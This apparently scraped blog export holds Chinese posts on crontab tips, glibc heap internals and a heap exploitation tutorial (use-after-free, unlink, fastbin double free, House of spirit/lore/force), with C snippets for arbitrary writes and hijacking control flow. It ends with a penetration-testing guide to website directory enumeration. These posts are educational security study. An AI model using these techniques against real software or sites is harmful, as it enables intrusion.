在crontab文件中定义多个调度任务时，需要特别注意的一个问题就是环境变量的设置，因为我们手动执行某个任务时，是在当前shell环境下进行的，程序当然能找到环境变量，而系统自动执行任务调度时，是不会加载任何环境变量的，因此，就需要在crontab文件中指定任务运行所需的所有环境变量，这样，系统执行任务调度时就没有问题了。 不要假定cron知道所需要的特殊环境，它其实并不知道。所以你要保证在shelll脚本中提供所有必要的路径和环境变量，除了一些自动设置的全局变量。所以注意如下3点： 1）脚本中涉及文件路径时写全局路径； 2）脚本执行要用到java或其他环境变量时，通过source命令引入环境变量，如： cat start_cbp.sh #!/bin/sh source /etc/profile export RUN_CONF=/home/d139/conf/platform/cbp/cbp_jboss.conf /usr/local/jboss-4.0.5/bin/run.sh -c mev &amp; 3）当手动执行脚本OK，但是crontab死活不执行时。这时必须大胆怀疑是环境变量惹的祸，并可以尝试在crontab中直接引入环境变量解决问题。如： 0 . /etc/profile;/bin/sh /var/www/java/audit_no_count/bin/restart_audit.sh 注意清理系统用户的邮件日志 每条任务调度执行完毕，系统都会将任务输出信息通过电子邮件的形式发送给当前系统用户，这样日积月累，日志信息会非常大，可能会影响系统的正常运行，因此，将每条任务进行重定向处理非常重要。 例如，可以在crontab文件中设置如下形式，忽略日志输出： 0 /3 /usr/local/apache2/apachectl restart &gt;/dev/null 2&gt;&amp;1 “/dev/null 2&gt;&amp;1”表示先将标准输出重定向到/dev/null，然后将标准错误重定向到标准输出，由于标准输出已经重定向到了/dev/null，因此标准错误也会重定向到/dev/null，这样日志输出问题就解决了。 系统级任务调度与用户级任务调度 系统级任务调度主要完成系统的一些维护操作，用户级任务调度主要完成用户自定义的一些任务，可以将用户级任务调度放到系统级任务调度来完成（不建议这么做），但是反过来却不行，root用户的任务调度操作可以通过“crontab –uroot –e”来设置，也可以将调度任务直接写入/etc/crontab文件，需要注意的是，如果要定义一个定时重启系统的任务，就必须将任务放到/etc/crontab文件，即使在root用户下创建一个定时重启系统的任务也是无效的。 其他注意事项 新创建的cron job，不会马上执行，至少要过2分钟才执行。如果重启cron则马上执行。 当crontab突然失效时，可以尝试/etc/init.d/crond restart解决问题。或者查看日志看某个job有没有执行/报错tail -f /var/log/cron。 千万别乱运行crontab -r。它从Crontab目录（/var/spool/cron）中删除用户的Crontab文件。删除了该用户的所有crontab都没了。 在crontab中%是有特殊含义的，表示换行的意思。如果要用的话必须进行转义\\%，如经常用的date ‘+%Y%m%d’在crontab里是不会执行的，应该换成date ‘+\\%Y\\%m\\%d’。","tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"堆利用的方法","date":"2017-11-17T12:17:45.000Z","path":"2017/11/17/堆利用的方法/","text":"在实际考虑堆利用方法时，chunk size的计算是个需要小心的地方，因为这里包括了 prev_size的复用，以及根据不同系统考虑的对齐情况，还有 chunk 的size位表示的是包括chunk header在内的size，而实际可用的size与此不同，它是减去chunk header后的大小。 我们还可以根据不同的条件去构造不同的chunk复用，像是只利用一个字节溢出（off-by-one）来使chunk size减小，以此来构造的poison_null_byte 漏洞等等。了解chunk复用的原理，就是去改变 size 位来使系统对错误的长度进行 malloc、free，这就是我们的目的。 近期做了一道题，对我的感触颇深，所以将其中用到的思想在此处进行展示： 堆块对堆的初始位置是没有任何限制的，也即堆块不一定要满足对其的条件。堆可以以0x6030f5开始 堆块大小的计算。#define chunksize(p) ((p)-&gt;size &amp; ~(SIZE_BITS)) 其中~(SIZE_BITS)=0xfffffff8 fastbin大小计算。(((sz)&gt;&gt;(SIZE_SZ==8?4:3))-2) 在针对fastbin attack或者double free时，保证fastbin大致相同具有十分重要的意义。例如0x7f的fastbin与0x70大小的fastbin在同一条链上。因此很多时候就可以构造0x7f大小的fastbin，代替很难找到的0x71\\0x70大小的fastbin fastbin取值范围32位[16-80]，64位[32-160] 貌似总共有9个，实际上只能用前8个 0×01 Use After Free要学习堆中的漏洞，最基础不过的就是这个 UAF 了，UAF 漏洞原理很简单，就是在 free 掉 chunk 后，指向该 chunk 的指针还能正常使用 123456789101112131415161718192021222324#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;struct shell &#123; void (*getshell)();&#125;;struct data &#123; int data;&#125;;void test_getshell()&#123; printf(&quot;I get the shell\\n&quot;);&#125;int main () &#123;struct shell *p;p = (struct shell*)malloc(sizeof(struct shell));p-&gt;getshell = test_getshell;free(p);struct data *q;q = (struct data*)malloc(sizeof(struct data));q-&gt;data = 1234;p-&gt;getshell();return 0;&#125; 编译运行一下 123Legend: code, data, rodata, valueStopped reason: SIGSEGV0x00000000000004d2 in ?? () 我们可以看到 p 指向的函数地址被我们用1234给替换掉了，这就意味着我们能够利用这样一个漏洞控制 rip 寄存器，执行指令。 0×02 unlinkunlink漏洞想必大家都不陌生，在前面我们提到过，系统通过 unlink 宏将 free chunk 从链表中取出，但是我在这里强调一下，并非所有从链表中取出 chunk 的操作都利用到了 unlink 宏，要知道，我们在 malloc 时，也多次将 chunk 从 bin 中取出，我想结合部分源码（只截取了取出部分的代码）来强调一下 unlink 的使用状况。 在 malloc 操作中，我们多次进行了 bin 之间的转移，具体如下 victim指的是被取出的地址 从 fastbin 中取出 chunk (fastbin后进先出) 123mfastbinptr* fb = &amp;fastbin (av, idx);victim = *fb;*fb = victim-&gt;fd; 从 unsortedbin 中取出 chunk 1234victim = unsorted_chunks(av)-&gt;bkbck = victim-&gt;bk;unsorted_chunks(av)-&gt;bk = bck;bck-&gt;fd = unsorted_chunks(av); 从 unsortedbin 向 smallbin 转移 chunk 1234if (in_smallbin_range(size)) &#123;victim_index = smallbin_index(size);bck = bin_at(av, victim_index);fwd = bck-&gt;fd; 从 unsortedbin 向 largebin 转移 chunk 12345mark_bin(av, victim_index);victim-&gt;bk = bck;victim-&gt;fd = fwd;fwd-&gt;bk = victim;bck-&gt;fd = victim; 从 smallbin 中取出 chunk 123456idx = smallbin_index(nb);bin = bin_at(av,idx);victim = last(bin);bck = victim-&gt;bk;bin-&gt;bk = bck;bck-&gt;fd = bin; 从 largebin 中取出 chunk 1unlink(victim, bck, fwd); 合并 fastbin 中 chunk 并加入到 unsortedbin 中(单向链表，bk指针需要获取) (这种情况比较特殊，如果实在找不到内存分配的话，可能会调用malloc_consolidate这个函数，它就会合并fastbin到unsortedbin中) 1234567prevsize = p-&gt;prev_size;size += prevsize;p = chunk_at_offset(p, -((long) prevsize));unlink(p, bck, fwd);......size += nextsize;unlink(nextchunk, bck, fwd); 我们发现不仅仅在 free 时进行向前向后合并时使用 unlink 宏，在 malloc 时也会有零星的 unlink 使用，而且一定要注意，上面的除了6、7外，在进行取出 chunk 操作时，并没有进行 unlink，所以在对这一部分进行漏洞利用时，不需要考虑 unlink 的检查。 现在言归正传，来看看 unlink 漏洞。 12345678#define unlink(P, BK, FD) &#123;FD = P-&gt;fd;BK = P-&gt;bk;if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P);else &#123;FD-&gt;bk = BK;BK-&gt;fd = FD; 上面所示是 unlink 宏的主要实现，我们现在设想申请两个chunk，并利用第一个chunk溢出到第二个chunk的size位，将第一个chunk的 inuse 位改写为 free状态，这时候我们再free第二个chunk，此时系统通过第二个chunk的size检查第一个chunk，发现他是free状态，那么这时候就会使用unlink将第一块chunk从bin中释放出来并与第二块合并 1234a = malloc(0x20)b = malloc(0x20) // b.size = 0x20 + chunk_header | inuse(0x01) == 0x31a[0x20+4] = 0x30 // 覆盖 inuse 位free(b) // 检查inuse位，发现 a 为 free，执行 unlink，合并两个 chunk 这时候其实a并没有在 bin 中，但是如果我们对 a 的前两个元素（即”fd”、”bk”）进行构造，那么就可以造成任意地址写入。 首先我们需要绕过检查,我们进行一个小小的计算(下面的栗子是64位系统) 1234P-&gt;bk-&gt;fd == P //64位 [P+0x18]+0x10 == P &lt;=&gt; [P+0x18] == P-0x10 &lt;=&gt; BK == P-0x10 //32位 [P+0xC]+0x8 == P &lt;=&gt; [P+0xC] == p-0x8 &lt;=&gt; BK == P-0x8P-&gt;fd-&gt;bk == P //64位 [P+0x10]+0x18 == P &lt;=&gt; [P+0x10] == P-0x18 &lt;=&gt; FD == P-0x18 //32位 [P+0x8]+0xC == P &lt;=&gt; [P+0x8] == P-0xC &lt;=&gt; FD == P-0xC 发现我们只需要在 b 的”fd”指针处放入 b-0×18,在”bk”指针处放入 b-0×10,即可绕过检查 执行完 unlink宏后，我们的b变成了这样 12345678910111213FD-&gt;bk = BK //64 *P = P - 0x10 //32 *p = p - 0x8BK-&gt;fd = FD //64 *P = P - 0x18 // 这一步覆盖上一步 //32 *p = p - 0xc计算流程：FD-&gt;bk = BK &lt;=&gt; (P-0x18)-&gt;bk = P-0x10 &lt;=&gt; [(P-0x18)+0x18] = P-0x10 &lt;=&gt; [P] = P-0x10 &lt;=&gt; *P = P-0x10同理，算出BK-&gt;fd = FD &lt;=&gt; *P = P - 0x18 也就是说 现在 b 处存放着 b-0×18 的地址，这时候我们再向 b 写入数据也就是向 b-0×18 处写入数据了 1234567--------|-------| b | |------------|-------| | ····· | | |--------|-------| | b-0x18 | |&lt;-----------|-------| 这时候我们通过两次写入来造成任意地址写入(假设我们能够写[b]的值，而且没有长度限制) 第一次写入0×18个字节，最后几位放入要写入的地址（此时覆盖了b） 1234567--------|-------| |-------| b |address|----&gt; | 写入 |--------|-------| |-------| ····· | |--------|-------| b-0x18 | AAAA |--------|-------| 我们再次写入时，就是修改该地址处的数据了，比如修改got表什么的（此时是对上一次写入的地址进行任意修改） 0×03 unsortedbin attack对 unsortedbin 的攻击主要利用从 unsortedbin 中取出 chunk 的操作来进行向任意位置写入一个不可控的指针,注意这里，从unsortedbin链表中取出chunk并不是使用unlink宏，所以不需要绕过 unlink 检查。首先我们需要创建两个 chunk 来避免 free 第一个 chunk 时将该 chunk 并入 top chunk(因为不连续，所以不会被合并),并且第一个 chunk 要足够大，确保其能进入到 unsortedbin中 12p = malloc(0x400)malloc(0x200) 然后将 p free掉，此时 p 进入到 unsortedbin中,然后改写其的 bk 指针,并malloc 123free(p)p[1] = 0xdeadbeef-0x10 // 任意地址 - 0x10malloc(0x400) 我们看一下从 unsortedbin 中取出 chunk 的操作 1234victim = unsorted_chunks(av)-&gt;bk // victim为free掉的pbck = victim-&gt;bk; // bck 为 任意地址 -0x10unsorted_chunks(av)-&gt;bk = bck; // 调整链表bck-&gt;fd = unsorted_chunks(av); // 任意地址 -0x10 + 0x10 = unsortedbin 这个漏洞自由度较小，不过可以用来修改一些阈值，例如更改libc中的max_fast，从而使得任意分配都使用fastbin来实现，为其他漏洞提供方便。 0×04 fastbin attack还记不记得我们在第一篇中那个介绍 fastbin 中 dobule free的例子 123456789#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main() &#123; char *a=malloc(24); char *b=malloc(24); free(a); free(b); free(a);&#125; 这个运行是没有问题的，但是想象一下，这样做之后，现在的 fastbin 中是什么样子 123 ------- ------- ------- ------- -------| 头结点 |-&gt; | a2 |-&gt; | b1 |-&gt; | a1 |-&gt;| null | ------- ------- ------- ------- ------- 其中的指向关系由chunk的 fd 指针标识。此时我们再从 fastbin中 malloc 出一个 chunk 1c = malloc(24); 此时的 fastbin 123 ------- ------- ------- -------| 头结点 |-&gt; | b1 |-&gt; | a1 |-&gt; | null | ------- ------- ------- ------- 现在我们得到了一个chunk，并且这个 chunk 同时在 fastbin中也存在，那么此时如果我们修改 c 的 fd 指针位置为任意地址，那么 fastbin 中 a 的指向也会发生改变 123 ------- ------- ------- -------| 头结点 |-&gt; | b1 |-&gt; | a1 |-&gt; |任意地址| ------- ------- ------- ------- 我们之后连续 malloc 两次 12malloc(24);malloc(24); 现在的 fastbin 123 ------- -------| 头结点 |-&gt; |任意地址| ------- ------- 那我们再次 malloc 时，就可以在任意地址创建一个 chunk 了，但是要注意的是，我们在之前提到过，从 fastbin 中取出 chunk 的时候会对 chunk 的size 做检查，也就是这个任意位置的 chunk 的 size 位必须构造。我们可以在栈中构造 1int stack = 0x30 // 24 + header = 0x28 ，0x10 对齐后 0x30 这个变量作为size位，我们可以将任意地址填充为 &amp;stack – 8，然后 malloc 之后会返回这个地址的 chunk，在栈中变量无法溢出时，我们可以向 chunk 里面写入数据来造成栈溢出。 12d = malloc(24);d[20] = 0xdeadbeef //控制rip, 此处的20并不是唯一的，依据具体情况而定 fastbin attack 中令人兴奋的一点是，它不需要对 chunk 进行溢出就可以进行攻击，这在一些对输入长度检查严格的地方可以得到奇妙的应用。 0×05 overlapping chunk 1幸运的是，并不是所有的程序都会对输入长度有严格的约束，当我们能够溢出到下一个 chunk 时，我们可以修改它的 size 位来造成 chunk 的覆盖。 首先，我们创建三个chunk,考虑 prev_size 的复用和 0x10字节对齐，我们将 malloc(0x100-8), 系统会给我们(0x100-8)+0x10-0×8,即0x100(0x10对齐)的空间，实际可用的空间正好是0x100-8，并没有多分配，而要是malloc(0x100)的话，你会看到实际可用的空间是0x108（这个不是必须的，只是向大家强调一下 chunk 大小的计算） 123a = malloc(0x100-8);b = malloc(0x100-8);c = malloc(0x100-8); 然后 free 掉 b，b就会放到 unsortedbin 中 ，这个bin只有一个链表，并不对size进行区分，所以我们可以放入0x100的chunk，修改为size为0x180后就可以拿出0x180的chunk 1free(b); 然后我们利用a溢出到b的size位 1*(a+0xf8) = 0x181 // 0x01标识a为inuse状态 现在我们malloc一个0×180的 chunk，系统就会将从b开始的0×180大小的空间返还，这其中包括c 1d = malloc(0x180-8); ok，现在我们就可以更改利用d更改c中的内容，如果c中包含某个函数指针，我们也可以去改变它. 0×06 overlapping chunk 2我们在前面先释放再修改size来获得了一个覆盖掉后面chunk 的 chunk，那么如果我们先修改size为一个大值，然后free会怎样呢？ 首先我们创建4个chunk 1234a = malloc(0x100-8);b = malloc(0x100-8);c = malloc(0x100-8);d = malloc(0x100-8);// 第四个为了防止被top chunk 合并，以及应对 free的检查 我们通过a溢出到b的size 1*(a+0xf8) = 0x201 // 0x1为inuse标识 我们这里讲b的size扩大到了c，由于free时需要检查下一个chunk的size，所以我们预留了d，并且防止free后直接与top chunk合并，之后我们free掉b，然后再次malloc就又包括了c 12free(p);e = malloc(0x200-8); 然后就可以可以像0×02一样去利用。 0×07 House of spirit假设我们可以在栈上伪造出一个chunk结构，那么我们可不可以利用free来释放，再次malloc得到这个chunk呢？House of spirit就是这个思路，当我们在栈上伪造出 chunk，并绕过检查的话，那么就可以实现 首先我们需要伪造chunk，但是要记住，在free执行的时候，会有一步检查，检查下一个chunk的size是否大于2*sizeof(size_t)，并且小于所有分配的空间，所以我们需要构造两个size位。 我们假设栈上有一个数组可以填充数据 1unsigned long long fake_chunks[10]; 我们开始构造要free的chunk的size 1fake_chunks[1] = 0x40; 然后为了绕过检查，需要在这个chunk后面紧跟一个chunk，设置其size位 1fake_chunks[9] = 0x1234; // 0x40/sizeof(unsigned long long) = 8 然后我们把 fake_chunks[2] 的地址作为参数调用free。堆块中，size的下一位为malloc返回的地址 1free(&amp;fake_chunk[2]);// size的下一位为malloc返回的地址 此时再进行malloc就可以得到该处的chunk 1p = malloc(0x30) // 根据 chunk size 计算公式 小于 0x38 即可 (0x38+0x10-0x08)(0x10对齐) 0×08 House of lore在前面的 House of spirit 中，我们尝试在栈上伪造了一个 chunk，那么接下来在 House of lore 中，我们将尝试伪造一条 smallbin链表，注意看，这里会用到我们在第一篇中讲过的 malloc分配流程的内容。 首先我们需要创建两个chunk，第一个用于进入smallbin中，第二个用来防止free后被top chunk合并 12victim = malloc(100) // size 位于 smallbin 范围内malloc(1000) //防止free后被top chunk合并 接下来我们要将这个 victim 送入 smallbin 中。 1free(victim); 我们先将其free掉，现在它位于unsortedbin中 1malloc(1200); 接下来，我们再次申请一个size位于largebin中，并且在unsortedbin中没有与其匹配的chunk，所以我们需要一个大值。 设想一下，接下来会发生什么？ 系统依次找完 fastbin、smallbin、unsortedbin后发现找不到这个size的chunk，接下来会把unsortedbin中的chunk加入到smallbin或者largebin中，这时，我们的victim就成功进入smallbin中了。 现在我们假设可以控制 victim的fd、bk指针，我们就可以在栈上伪造出一个smallbin的链表 1234567891011121314 intptr_t* stack_buffer_1[4] = &#123;0&#125;; // 堆1 intptr_t* stack_buffer_2[3] = &#123;0&#125;; // 堆2 intptr_t *victim_chunk = victim-2; // 堆块位置 stack_buffer_1[0] = 0; stack_buffer_1[1] = 0; stack_buffer_1[2] = victim_chunk; stack_buffer_1[3] = (intptr_t*)stack_buffer_2; stack_buffer_2[2] = (intptr_t*)stack_buffer_1; victim[1] = (intptr_t)stack_buffer_1; [victim]&lt;---| |-&gt;[stack_buffer_1]&lt;--| |--&gt;[stack_buffer_2][ fd ] |-|--[ fd ] |-|---[ fd ][ bk ]------| [ bk ]-----| [ bk ] 那么我们再次malloc时，就可以从smallbin的链表末尾取chunk了。这里应该是stack_buffer_2 1void *p3 = malloc(100); 而当我们在栈上创造出 chunk 后，就可以向chunk中写入来覆盖返回地址控制eip，甚至绕过 canary检查。 0×09 House of force在 House of force 中，我们这样设想，如果我们能够将top chunk的size覆盖为一个巨大的值，是否就可以实现malloc从堆直接到.bss段、到栈？ 我们首先创建一个 chunk，紧跟着这个chunk的就是top chunk 1p = malloc(0x100-8); 我们设法溢出到top chunk 1*(p+0xf8) = -1; 那么现在top chunk 的size 就是 0xffffffffffffffff，现在我们可以计算一下从top chunk的起始地址到我们要覆盖的地址之间的距离，然后malloc一个巨大的chunk填充这一段距离，然后再次malloc一个小chunk，向小chunk中写入数据就可以改变这里的值。 123malloc(big_size);q = malloc(100);*q = &quot;hello world&quot;;","tags":[{"name":"heap","slug":"heap","permalink":"http://yoursite.com/tags/heap/"}]},{"title":"浅析堆的申请释放及相应保护机制","date":"2017-11-17T12:04:44.000Z","path":"2017/11/17/浅析堆的申请释放及相应保护机制/","text":"0×00 前面的话在了解这部分的时候，首先你最好阅读一下这两篇博客： Linux堆内存管理深入分析（上） Linux堆内存管理深入分析（下） 在内存中，堆是一个很有趣的地方，因为它可以由用户去直接的进行分配与销毁，所以也产生了一些很有趣、奇思妙想的漏洞，像unlink漏洞、House系列漏洞等等。但是在学习的过程中，我们很容易难以理解那些介绍的比较模糊的概念，比如 unsortedbin 在某些条件下会放回 smallbin 或 largebin 中，那到底是什么时候？也会对一些大佬构造的 payload 犯迷糊，为什么这里多了一个chunk，为什么这个字节要填充…，大佬们往往不对这些细节做过多的解释，但是这可难为了我们初学堆利用的新兵，所以，我想写几篇文章，将堆的运作机制，例如一些基本的概念，malloc机制、free机制、保护机制，和利用方法结合起来说一下，让大家能够对堆这一块有个较为清楚的认识，少走一些弯路。首先呢，我想在这篇文章中较为细致的介绍一下堆中的一些情况，剩下的有机会的话我会一并写成一个系列。 这篇文章主要分为四个部分： 12340x01 chunk 简介0x02 bin 简介0x03 malloc 机制0x04 free 机制 这些内容相对比较重要，如果看完还觉得不够的，推荐大家去读一下华庭老师的《glibc内存管理ptmalloc源代码分析》。 0×01 chunk 简介首先先说一下堆是如何分配的，在内存中，堆（低地址到高地址，属性RW）有两种分配方式（与malloc申请chunk做区分）: 12mmap: 当申请的size大于128kb时，由mmap分配。有时候是0x22000brk: 当申请的size小于128kb时，由brk分配，第一次分配132KB（main arena）,第二次在brk下分配，不够则执行系统调用，向系统申请 在内存中进行堆的管理时，系统基本是以 chunk 作为基本单位，chunk的结构在源码中有定义 123456789struct malloc_chunk &#123; INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;; INTERNAL_SIZE_T 即 size_t 123#ifndef INTERNAL_SIZE_T#define INTERNAL_SIZE_T size_t#endif 我们可以打印一下本机的 sizeof(size_t)，这个长度可以说是一个基准单位 12345#include&lt;stdio.h&gt;int main() &#123; printf(&quot;sizeof(size_t) is %d\\n&quot;,sizeof(size_t)); return 0;&#125; 这个结构不再多谈，相关的介绍网上很多，主要提一下结构体中最后两个指针 fd_nextsize 和 bk_nextsize，这两个指针只在 largebin 中使用，其他情况下为 NULL。我们可以根据 chunk 的状态将其分为三种（allocated chunk、free chunk、top chunk）: 123456789101112131415161718192021222324allocated chunk: chunk header: prev_size（当上一块是free状态时，存储该chunk的size，否则被上一块chunk使用） size（该chunk大小（包括chunk header），某位3 bits为标志位） 0bit表示上一chunk是否free 1bit表示该chunk是否由mmap分配 2bit表示该chunk是否属于main arena data: free chunk: chunk header: prev_size: size: fd:指向 bin 中的next chunk bk:指向 bin 中的last chunk（bin中先进的为last，后进的为next） fd_nextsize: bk_nextsize:top chunk:brk中未分配的顶端chunk chunk header: prev_size: size: 其中在 free chunk中有一种特殊的chunk(last remainder chunk): 1last remainder chunk:从free chunk中malloc时，如果该chunk足够大，那么将其分为两部分，未分配的放到last remainder中并交由 unsorted bin 管理。 重点强调一下：这里的上一块表示在内存的堆中连续的chunk的上一块，区别bin中的前后关系。另外 chunk 的前后关系只有在bin中是使用fd、bk指针标识的，在内存中连续的chunk则通过 prev_size 和 size 来寻找前后 chunk，当然，这也就造成了漏洞。 由于chunk会在几种状态之间切换，当其为free chunk时，最少需要4sizeof(size_t)的空间，所以有最小分配大小。并且由于prev_size的复用，所以实际申请的大小为 max(2sizeof(size_t)(chunk_header)-sizeof(size_t)(prev_size)+申请大小, 最小分配大小)，而且 chunk的size是按照 2sizeof(size_t)对齐的，也就是说当你申请一个不是 2sizeof(size_t)整倍数的空间时， malloc 返回的 size 有会对齐，大于实际申请的空间。 另外提一下，当 malloc 一个chunk后，实际返回用户的地址为chunk除去chunk header后的地址，而在bin中存储的是chunk的地址，也就是说 12p = malloc(0x40); // 假设chunk的地址为 0xdeadbeef,则返回给用户的地址是 0xdeadbeef+sizeof(chunk header)free(p) //将p释放掉后，保存在bin中的地址为 0xdeadbeef 0×02 bin简介bin在内存中用来管理free chunk，bin为带有头结点（链表头部不是chunk）的链表数组，根据特点，将bin分为四种，分别为(fastbin、unsortedbin、smallbin、largebin): 123456789101112131415161718192021222324fastbin: 根据chunk大小维护多个单向链表 sizeof(chunk) &lt; 64(bytes) 下一chunk（内存中）的free标志位不取消，显示其仍在使用 后进先出（类似栈），后free的先被malloc 拥有维护固定大小chunk的10个链表unsortedbin: 双向循环链表 不排序 暂时存储free后的chunk，一段时间后会将chunk放入对应的bin中（详见0x02） 只有一个链表smallbin: 双向循环链表 sizeof(chunk) &lt; 512 (bytes) 先进先出（类似队列） 16,24...64,72...508 bytes(62个链表)largebin: 双向循环链表 sizeof(chunk) &gt;= 512 (bytes) free chunk中多两个指针分别指向前后的large chunk 63个链表:0-31(512+64*i) 32-48(2496+512*i) ... 链表中chunk大小不固定，先大后小 这其中 fastbin 像是cache，用来实现快速的chunk分配，其中的chunk size大小与smallbin中的有重复（只是说大小，chunk并不重复） unsortedbin 功能也是作为cache，尽量减少搜索合适chunk的时间。 这四个bin中，除了fastbin，其他三个都是维护双向循环链表，并且由一个长度为128 size_t的数组bins维护，bins结构如下： NULL unsortbin smallbin largebin NULL 0 1 2-63 64-126 127 0×03 malloc机制malloc功能主要由 _int_malloc() 函数实现，原型如下： 1static Void_t* _int_malloc(mstate av,size_t bytes) 当接收到申请的内存大小后，我们看一下malloc的申请过程。 12345678910111213141516171819202122长度位于 fastbin 时: 1.根据大小获得fastbin的index 2.根据index获取fastbin中链表的头指针 如果头指针为 NULL，转去smallbin 3.将头指针的下一个chunk地址作为链表头指针 4.分配的chunk保持inuse状态，避免被合并 5.返回除去chunk_header的地址长度位于 smallbin 时: 1.根据大小获得smallbin的index 2.根据index获取smallbin中双向循环链表的头指针 3.将链表最后一个chunk赋值给victim 4.if(victim == 表头) 链表为空，不从smallbin中分配 else if(victim == 0) 链表未初始化，将fastbin中的chunk合并 else 取出victim,设置inuse 5.检查victim是否为main_arena,设置标志位 6.返回除去chunk_header的地址长度位于 largebin 时: 1.根据大小获得largebin的index 2.将fastbin中chunk合并，加入到unsortbin中 留意一点：系统实际分配的内存地址与返回的地址是不同的，返回的地址直接指向了除去 chunk header 的地址。 当然，我们注意到上面的分配过程并没有完成，当 smallbin 中没有 chunk 或者 smallbin 未初始化时，并没有返回分配结果，这种情况下的chunk分配将在后面与largebin的分配一起处理 12345678910111213141516unsortedbin: 1.反向遍历unsortedbin,检查 2*size_t&lt;chunk_size&lt;内存总分配量 2.unsortedbin的特殊分配: 如果前一步smallbin分配未完成 并且 unsortedbin中只有一个chunk 并且该chunk为 last remainder chunk 并且该chunk大小 &gt;（所需大小+最小分配大小） 则切分一块分配 3.如果请求大小正好等于当前遍历chunk的大小，则直接分配 4.继续遍历，将合适大小的chunk加入到smallbin中，向前插入作为链表的第一个chunk。(smallbin中每个链表中chunk大小相同) 5.将合适大小的chunk加入到largebin中，插入到合适的位置（largebin中每个链表chunk由大到小排列）largebin: 1.反向遍历largebin，由下到上查找，找到合适大小后切分 切分后大小&lt;最小分配大小，返回整个chunk，会略大于申请大小 切分后大小&gt;最小分配大小，加入 unsortedbin。 2.未找到，index+1，继续寻找 如果这之后还未找到合适的chunk，那么就会使用top chunk进行分配,还是没有的话，如果在多线程环境中，fastbin可能会有新的chunk，再次执行合并，并向unsortedbin中重复上面，还是没有的话，就只能向系统申请了。 以上就是malloc分配的全经过。 几个malloc检查： 12341.从fastbin中取出chunk后，检查size是否属于fastbin2.从smallbin中除去chunk后，检查victim-&gt;bk-&gt;fd == victim3.从unsortbin取chunk时，要检查2*size_t&lt;chunk_size&lt;内存总分配量4.从largebin取chunk时，切分后的chunk要加入unsortedbin,需要检查 unsortedbin的第一个chunk的bk是否指向unsortedbin 0×04 free机制1.首先使用 chunksize(p) 宏获取p的size12345#define PREV_INUSE 0x1#define IS_MMAPPED 0x2#define NON_MAIN_ARENA 0x4#define SIZE_BITS (PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA)#define chunksize(p) ((p)-&gt;size &amp; ~(SIZE_BITS)) 也就是直接屏蔽了控制位信息，不过不要紧，chunk的分配是 2*sizeof(size_t) 对齐的，所以屏蔽低三位对大小无影响 2.安全检查：12chunk的指针地址不能溢出chunk 的大小 &gt;= MINSIZE(最小分配大小)，并且检查地址是否对齐 3.大小为fastbin的情况(不改变inuse位)1231).检查下一个chunk的size：2*size_t&lt;chunk_size&lt;内存总分配量2).double free检查： 检查当前free的chunk是否与fastbin中的第一个chunk相同，相同则报错 简单的小例子 12345678#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main() &#123; char *a=malloc(24); char *b=malloc(24); free(a); free(a);&#125; 报错 123456789#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main() &#123; char *a=malloc(24); char *b=malloc(24); free(a); free(b); free(a);&#125; 没问题 4.其他情况123456789101112131).检查下一个chunk的size：2*size_t&lt;chunk_size&lt;内存总分配量 如果当前 chunk 为 sbrk()分配，那么它相邻的下一块 chunk 超过了分配区的地址，会报错2).double free检查： 检查当前free的chunk是否为top chunk，是则报错 根据下一块的inuse标识检查当前free的chunk是否已被free3) unlink合并： 检查前后chunk是否free，然后向后（top chunk方向）合并，并改变对应的inuse标志位 unlink检查： I.当前chunk的size是否等于下一chunk的prev_size II.P-&gt;bk-&gt;fd == P &amp;&amp; P-&gt;bk-&gt;fd == P 如果合并后 chunk_size &gt; 64bytes,则调用函数合并fastbin中的chunk到unsortedbin中 将合并后的chunk加入unsortedbin4) unsortedbin检查 需要检查 unsortedbin的第一个chunk的bk是否指向unsortedbin 我们可以看到，针对free的检查主要是下一块的size和inuse位，另外fastbin的检查可以用来做double free。 0×05以上就是对堆的情况所做的一些介绍，了解堆的保护机制后，我们便可以在攻击时想办法进行绕过，从而构造出那些光怪陆离的payload。 *本文原创作者：hellowuzekai，属于FreeBuf奖励计划，禁止转载","tags":[{"name":"heap","slug":"heap","permalink":"http://yoursite.com/tags/heap/"}]},{"title":"渗透测试经验之谈","date":"2017-11-15T12:44:31.000Z","path":"2017/11/15/渗透测试经验之谈/","text":"1,分析目标网站内容及功能 (1) 首先确定网站采用何种语言编写.或者是否有混用的情况.此处可以通过查看网站源文件,观察网站链接,捕获提交请求等方式获取. (2) 爬行网站目录,使用工具对网站目录进行爬行,可以辅助上一步让结果更加精准.将爬行结果存档,如果可以,此处应分析出网站是否使用通用程序,如果是,记录下来.进行下一步. (3) 根据上一步的爬行结果,对网站根目录或者关键目录进行暴力目录探测,如果网站为通用程序,判读是否有过二次开发,如非通用程序,在探测到的目录中寻找关键目录及文件. 此步骤详细测试方法: 123451.输入并访问一些不可能存在的文件或目录名,再输入并访问一些通过目录爬行已知存在的目录及文件名,从而得知服务器如何处理无效资源. 2.使用网站爬行到的结果作为此步骤暴力目录探测的依据,扫描关键目录或全部. 3.确定服务器如何处理文件无法找到的回应,并使用关键字技术来处理这些回应.从而判断有效资源及无效资源. 4.收集此步骤暴力扫描得到的结果,并手工检测探测到目录的有效性. 5.重复以上步骤,得到更多更关键的目录及文件. (4) 通过上面步骤,得到一个完整的网站目录结构,以及枚举到的所有目录名称,文件名称及文件扩展名.了解网站开发人员的命名思路,确定其命名规则,推测出更多的目录及文件名. 此步骤详细测试方法: 1.检查整个列表中的文件命名规则,判读其命名依据,如发现几个部分内容相同的文件名,addnews.php,viewnews.php,那么我们就可以尝试是否存在editnews.php,delnews.php,通常只要查看几个文件名,就可以推测出网站开发人员的命名习惯,根据其个人风格,开发者可能采用各种命名方法,如冗长式(addnewuser.php),简洁式(adduser.php),缩写式(addusr.php),或者更加模糊的命名方式(addu.php).了解开发者使用的命名习惯有助于推测出尚未确定内容的准确名称. 